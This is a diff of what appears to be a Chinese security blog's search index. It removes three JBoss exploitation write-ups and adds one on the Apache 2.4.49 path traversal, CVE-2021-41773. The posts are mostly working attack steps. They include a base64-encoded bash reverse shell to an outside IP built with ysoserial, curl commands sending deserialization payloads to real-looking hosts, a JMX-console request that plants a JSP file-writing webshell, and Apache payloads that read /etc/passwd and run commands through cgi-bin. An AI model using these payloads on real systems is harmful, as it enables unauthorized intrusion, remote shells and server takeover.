@@ -4,36 +4,11 @@
   
     
     <entry>
-      <title>JBOSS CVE-2017-12149</title>
-      <link href="/2021/07/05/JBOSS%20CVE-2017-12149%E5%A4%8D%E7%8E%B0/"/>
-      <url>/2021/07/05/JBOSS%20CVE-2017-12149%E5%A4%8D%E7%8E%B0/</url>
+      <title>Apache HTTP Server 2.4.49 路径穿越漏洞(CVE-2021-41773)</title>
+      <link href="/2021/10/09/Apache-HTTP-Server-2-4-49-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E-CVE-2021-41773/"/>
+      <url>/2021/10/09/Apache-HTTP-Server-2-4-49-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E-CVE-2021-41773/</url>
       
-        <content type="html"><![CDATA[<p>[toc]</p><h2 id="JBOSS-CVE-2017-12149复现"><a href="#JBOSS-CVE-2017-12149复现" class="headerlink" title="JBOSS CVE-2017-12149复现"></a>JBOSS CVE-2017-12149复现</h2><h3 id="一、影响范围"><a href="#一、影响范围" class="headerlink" title="一、影响范围"></a>一、影响范围</h3><p>漏洞影响5.x和6.x版本的JBOSS AS。</p><h3 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h3><p>JBOSS Application Server是一个基于J2EE的开放源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用，2006年，JBoss被Redhat公司收购。</p><p>2017年8月30日，厂商Redhat发布了一个JBOSSAS 5.x 的反序列化远程代码执行漏洞通告。该漏洞位于JBoss的HttpInvoker组件中的 ReadOnlyAccessFilter 过滤器中，其doFilter方法在没有进行任何安全检查和限制的情况下尝试将来自客户端的序列化数据流进行反序列化，导致攻击者可以通过精心设计的序列化数据来执行任意代码。但近期有安全研究者发现JBOSSAS 6.x也受该漏洞影响，攻击者利用该漏洞无需用户验证在系统上执行任意命令，获得服务器的控制权。</p><h3 id="三、攻击过程"><a href="#三、攻击过程" class="headerlink" title="三、攻击过程"></a>三、攻击过程</h3><p>访问漏洞环境<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606543_20200907102825405_8279.png"><br>访问访问<a href="http://8.210.152.234:8080//invoker/readonly">http://8.210.152.234:8080//invoker/readonly</a> 页面返回500错误 ,基本可以判断存在此漏洞<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606543_20200907102314863_29332.png"></p><h4 id="1-开启nc监听"><a href="#1-开启nc监听" class="headerlink" title="1.开启nc监听"></a>1.开启nc监听</h4><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606543_20200907102937678_15577.png"></p><h4 id="2-生成反弹shell命令"><a href="#2-生成反弹shell命令" class="headerlink" title="2.生成反弹shell命令"></a>2.生成反弹shell命令</h4><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606543_20200907103148639_996.png"></p><h4 id="3-反弹shell命令转换以后得到密令如下"><a href="#3-反弹shell命令转换以后得到密令如下" class="headerlink" title="3.反弹shell命令转换以后得到密令如下"></a>3.反弹shell命令转换以后得到密令如下</h4><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606543_20200907103459983_28482.png"></p><h4 id="4-序列化数据生成"><a href="#4-序列化数据生成" class="headerlink" title="4.序列化数据生成"></a>4.序列化数据生成</h4><p>使用ysoserial生成序列化数据，由于Vulhub使用的Java版本较新，所以选择使用的gadget是CommonsCollections5,如果不成功可以换成CommonsCollections6。1-10 都可以</p><pre><code>java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjIxMC4yMzUuMjQ5Lzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt;bb.ser</code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606544_20200907104817445_3967.png"><br>将文件发送到服务器中(建议使用curl,曾经尝试使用burp发送 未成功)<br>命令如下<br><code>curl http://8.210.169.237:8080//invoker/readonly --data-binary @cs.ser</code><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606544_20200907104950059_18821.png"></p><h4 id="5-发送完成shell到手"><a href="#5-发送完成shell到手" class="headerlink" title="5.发送完成shell到手"></a>5.发送完成shell到手</h4><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606544_20200907105040493_6371.png"></p><h3 id="三、一键利用工具推荐"><a href="#三、一键利用工具推荐" class="headerlink" title="三、一键利用工具推荐"></a>三、一键利用工具推荐</h3><p><code>https://github.com/yunxu1/jboss-_CVE-2017-12149</code><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606544_20200907105427737_25318.png"></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> 漏洞复现 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> jboss - jboss 复现 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Jboss CVE-2017-7504</title>
-      <link href="/2021/07/05/Jboss%20CVE-2017-7504/"/>
-      <url>/2021/07/05/Jboss%20CVE-2017-7504/</url>
-      
-        <content type="html"><![CDATA[<p>[toc]</p><h2 id="JBOSSMQ-JMS-CVE-2017-7504-集群反序列化漏洞-4-X"><a href="#JBOSSMQ-JMS-CVE-2017-7504-集群反序列化漏洞-4-X" class="headerlink" title="JBOSSMQ JMS CVE-2017-7504 集群反序列化漏洞 4.X"></a>JBOSSMQ JMS CVE-2017-7504 集群反序列化漏洞 4.X</h2><h3 id="0x01漏洞描述"><a href="#0x01漏洞描述" class="headerlink" title="0x01漏洞描述"></a>0x01漏洞描述</h3><p>JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java⽂件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利⽤该漏洞执⾏任意代码。</p><h3 id="0x02影响版本"><a href="#0x02影响版本" class="headerlink" title="0x02影响版本"></a>0x02影响版本</h3><p>JBoss AS 4.x及之前版本</p><h3 id="0x03漏洞利用"><a href="#0x03漏洞利用" class="headerlink" title="0x03漏洞利用"></a>0x03漏洞利用</h3><hr><p>1、首先验证目标jboss是否存在此漏洞,直接访问<br>/jbossmq-httpil/HTTPServerILServlet 路径下。若访问200或下载，则可能存在漏洞。<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606636_20201208220941482_14194.png"><br>此处我们使用<a href="https://github.com/joaomatosf/JavaDeserH2HC">JavaDeserH2HC</a>工具来利用该漏洞,尝试直接弹回一个shell<br>注意：这个工具在linux系统使用</p><pre><code>javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.javajava -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 反弹的IP:端口curl http://目标IP:8080/jbossmq-httpil/HTTPServerILServlet/ --data-binary @ReverseShellCommonsCollectionsHashMap.ser</code></pre><p><strong>端口监听：</strong><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606636_20201208221156161_24717.png"><br>反弹shell成功<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606636_20201208221425595_28775.png"></p>]]></content>
+        <content type="html"><![CDATA[<h2 id="Apache-HTTP-Server-2-4-49-路径穿越漏洞-CVE-2021-41773"><a href="#Apache-HTTP-Server-2-4-49-路径穿越漏洞-CVE-2021-41773" class="headerlink" title="Apache HTTP Server 2.4.49 路径穿越漏洞(CVE-2021-41773)"></a>Apache HTTP Server 2.4.49 路径穿越漏洞(CVE-2021-41773)</h2><h3 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h3><p>Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：<br>版本等于2.4.49<br>穿越的目录允许被访问，比如配置了<Directory />Require all granted</Directory>。（默认情况下是不允许的）<br>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p><p><strong>参考链接：</strong></p><ul><li><a href="https://httpd.apache.org/security/vulnerabilities_24.html">https://httpd.apache.org/security/vulnerabilities_24.html</a></li><li><a href="https://twitter.com/ptswarm/status/1445376079548624899">https://twitter.com/ptswarm/status/1445376079548624899</a></li><li><a href="https://twitter.com/HackerGautam/status/1445412108863041544">https://twitter.com/HackerGautam/status/1445412108863041544</a></li><li><a href="https://twitter.com/snyff/status/1445565903161102344">https://twitter.com/snyff/status/1445565903161102344</a></li><li><a href="https://github.com/vulhub/vulhub/blob/master/httpd/CVE-2021-41773/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/httpd/CVE-2021-41773/README.zh-cn.md</a></li></ul><h3 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h3><p>使用如下CURL命令来发送Payload（注意其中的/icons/必须是一个存在且可访问的目录）：<br><code>curl -v --path-as-is http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code></p><pre><code>GET //icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1Host: 106.55.147.147:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0Accept: */*Accept-Language: zh-CN,en;q=0.5Accept-Encoding: gzip, deflateConnection: closePragma: no-cacheCache-Control: no-cache</code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/2871523259279.png"></p><p>在服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令：<br><code>curl -v --data &quot;echo;id&quot; &#39;http://your-ip:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#39;</code><br><code>curl -v --data &quot;echo;id&quot; -x 127.0.0.1:8080 &#39;http://106.55.147.147:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#39;</code><br>-x 代表代理</p><pre><code>POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1Host: Your ip:8080User-Agent: curl/7.64.1Accept: */*Content-Length: 7Content-Type: application/x-www-form-urlencodedConnection: closeecho;id</code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/198315816802.png"></p>]]></content>
       
       
       <categories>
@@ -45,36 +20,7 @@
       
         <tags>
             
-            <tag> jboss </tag>
-            
-            <tag> jboss 复现 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Jboss JMX Console未授权访问Getshell</title>
-      <link href="/2021/07/05/Jboss%20JMX%20Console%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AEGetshell/"/>
-      <url>/2021/07/05/Jboss%20JMX%20Console%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AEGetshell/</url>
-      
-        <content type="html"><![CDATA[<p>[toc]</p><h2 id="Jboss-JMX-Console未授权访问Getshell"><a href="#Jboss-JMX-Console未授权访问Getshell" class="headerlink" title="Jboss JMX Console未授权访问Getshell"></a>Jboss JMX Console未授权访问Getshell</h2><h3 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>由于JBoss中/jmx-console/HtmlAdaptor路径对外开放，并且没有任何身份验证机制，导致攻击者可以进⼊到jmx控制台，并在其中执⾏任何功能</p><h3 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h3><p>Jboss4.x以下版本。</p><h3 id="利用方式："><a href="#利用方式：" class="headerlink" title="利用方式："></a>利用方式：</h3><blockquote><p>Jboxx4.x /jmx-console/ 后台存在未授权访问，进入后台后，可直接部署 war 包Getshell。若需登录，可以尝试爆破弱口令登录（类似于tomcat的War包配置漏洞）</p></blockquote><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建:"></a>环境搭建:</h3><h4 id="0x01-使用docker搭建漏洞环境"><a href="#0x01-使用docker搭建漏洞环境" class="headerlink" title="0x01:使用docker搭建漏洞环境"></a>0x01:使用docker搭建漏洞环境</h4><blockquote><p>一键安装Docker<br>这是推荐方式。在未安装过Docker的机器上，root权限执行如下命令即可一键安装最新版Docker：<br>curl -s <a href="https://get.docker.com/">https://get.docker.com/</a> | sh </p></blockquote><p>1、搜索漏洞环境：</p><pre><code>sudo docker search testjboss</code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/5759958140263.png"><br>2、拉取镜像：</p><pre><code>sudo docker pull testjboss/jboss</code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/3844100168689.png"><br>3、查看现有的docker环境</p><pre><code>sudo docker images</code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/1123202156556.png"><br>4、运行环境，访问<a href="http://ip即可/">http://ip即可</a></p><pre><code>sudo docker run -p 80:8080 -d testjboss/jboss</code></pre><hr><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现:"></a>漏洞复现:</h3><h4 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1:"></a>Method 1:</h4><p><a href="http://your/">http://Your</a> IP/jmx-console  直接访问jboss控制台</p><pre><code>http://Your IP/jmx-console//HtmlAdaptor?action=invokeOpByName&amp;name=jboss.admin%3Aservice%3DDeploymentFileRepository&amp;methodName=store&amp;argType=java.lang.String&amp;arg0=August.war&amp;argType=java.lang.String&amp;&amp;arg1=shell&amp;argType=java.lang.String&amp;arg2=.jsp&amp;argType=java.lang.String&amp;arg3=%3c%25+if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b+%25%3e&amp;argType=boolean&amp;arg4=True</code></pre><p>url中的参数：arg0代表war包的名称，arg1=文件名称，arg2=文件后缀名，arg3=文件内容<br>url解码为：</p><pre><code>http://Your IP/jmx-console//HtmlAdaptor?action=invokeOpByName&amp;name=jboss.admin:service=DeploymentFileRepository&amp;methodName=store&amp;argType=java.lang.String&amp;arg0=August.war&amp;argType=java.lang.String&amp;&amp;arg1=shell&amp;argType=java.lang.String&amp;arg2=.jsp&amp;argType=java.lang.String&amp;arg3=&lt;%+if(request.getParameter(&quot;f&quot;)!=null)(new+java.io.FileOutputStream(application.getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());+%&gt;&amp;argType=boolean&amp;arg4=True</code></pre><p><strong>功能是写入文件，f=文件名，t=文件内容</strong></p><p>写入hack.txt文件</p><pre><code>http://Your IP/August/shell.jsp?f=hack.txt&amp;t=Are you script boy</code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/5198123176722.png"><br>访问hack.txt文件<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/758824169391.png"></p><hr><h4 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2:"></a>Method 2:</h4><p>首先制作一个war木马（需要jdk），在jsp小马目录下cmd执行：</p><pre><code>jar cvf shell.war test.jsp</code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/3179648165946.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/911249179580.png"><br>若报拒绝访问错误，请使用管理员权限运行cmd<br><strong>将war包放在自己的WEB服务器上</strong></p><pre><code> python3 -m http.server 777    #使用python起临时web服务 端口为777</code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/4961950174686.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/4532151155927.png" alt="\\"></p><hr><p>Jboxx4.x /jmx-console/ 后台存在未授权访问，进入后台后，可直接部署 war 包Getshell。若需登录，可以尝试爆破弱口令登录。<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/1174650177184.png"><br>然后找到jboss.deployment（jboss 自带的部署功能）中的flavor=URL,type=DeploymentScanner点进去（通过 url 的方式远程部署）<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/1104253178367.png"><br> 也可以直接输入URL进入：</p><pre><code>http://Your IP/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.deployment:type=DeploymentScanner,flavor=URL</code></pre><p><img src="vx_images/4759354173503.png"><br>找到页面中的void addURL()选项来远程加载war包来部署。<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/5814456160183.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/3690404160713.png"><br>查看部署是否成功<br>返回到刚进入jmx-console的页面，找到 jboss.web.deployment，如下说明部署成功。如果没显示，多刷新几次页面或者等会儿，直到看到有部署的war包即可</p><h3 id="检测工具"><a href="#检测工具" class="headerlink" title="检测工具:"></a>检测工具:</h3><p>检测工具：jexboss，一个使用Python编写的Jboss漏洞检测利用工具，通过它可以检测并利用web-console，jmx-console，JMXInvokerServlet这三个漏洞，并且可以获得一个shell。<br>使用：</p><pre><code>python jexboss.py -u http://ip:port</code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/2538330172164.png"></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> 漏洞复现 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> jboss </tag>
-            
-            <tag> jboss 复现 </tag>
+            <tag> Apache </tag>
             
         </tags>
       
